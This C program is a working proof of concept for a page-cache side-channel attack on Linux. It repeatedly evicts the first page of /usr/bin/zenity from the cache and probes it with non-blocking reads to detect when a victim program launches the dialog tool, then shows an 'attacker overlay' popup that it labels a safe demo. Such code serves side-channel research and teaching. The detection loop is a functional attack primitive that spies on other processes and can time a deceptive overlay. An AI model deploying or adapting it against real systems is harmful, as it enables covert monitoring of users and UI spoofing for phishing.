#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/uio.h>
#include <time.h>
#include <unistd.h>

static ssize_t probe(int fd)
{
	char byte;
	struct iovec iov = {&byte, 1};
	return preadv2(fd, &iov, 1, 0, RWF_NOWAIT);
}

static int flush(int fd)
{
	int error = posix_fadvise(fd, 0, 4096, POSIX_FADV_DONTNEED);
	if (error)
		errno = error;
	return error;
}

int main(void)
{
	int fd = open("/usr/bin/zenity", O_RDONLY);
	struct timespec window = {0, 1000000};
	unsigned long rounds = 0;
	if (fd == -1) {
		perror("open /usr/bin/zenity");
		return 1;
	}

	puts("ATTACKER: monitoring /usr/bin/zenity (1 ms window)");
	puts("ATTACKER: start ./ui-victim in another terminal");
	for (;;) {
		if (flush(fd)) {
			perror("flush");
			return 1;
		}
		nanosleep(&window, NULL);
		errno = 0;
		ssize_t result = probe(fd);
		++rounds;
		if (result == 1)
			break;
		if (result != -1 || errno != EAGAIN) {
			perror("preadv2");
			return 1;
		}
		do {
			result = probe(fd);
		} while (result == -1 && errno == EAGAIN);
		if (result != 1 || flush(fd)) {
			perror("restore");
			return 1;
		}
	}

	flush(fd);
	printf("ATTACKER: victim UI detected after %lu rounds\n", rounds);
	system("zenity --info --timeout=3 --width=430 "
	       "--title='ATTACKER OVERLAY — SAFE DEMO' "
	       "--text='Flush+Monitor detected the victim dialog.\\n\\n"
	       "This overlay requests and stores no data.' 2>/dev/null");
	close(fd);
	return 0;
}
